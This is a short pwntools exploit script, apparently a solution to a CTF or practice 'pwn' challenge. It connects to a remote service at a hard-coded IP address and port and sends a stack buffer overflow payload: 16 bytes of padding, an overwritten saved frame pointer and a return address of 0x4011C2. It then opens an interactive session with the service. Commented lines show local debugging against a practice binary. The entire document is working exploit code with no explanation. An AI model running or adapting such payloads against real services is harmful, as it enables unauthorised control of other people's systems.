from pwn import *
# context.terminal = ['tmux', 'splitw', '-h']
context.log_level='debug'
context(arch='amd64', os='linux')
io=remote('120.53.240.208',6000)

# ELFpath='/home/lixingjian/practicepwn'

# io=process(ELFpath)

# gdb.attach(io)

payload=b'a'*(16)+p64(0)+p64(0x4011C2)

io.send(payload)

io.interactive()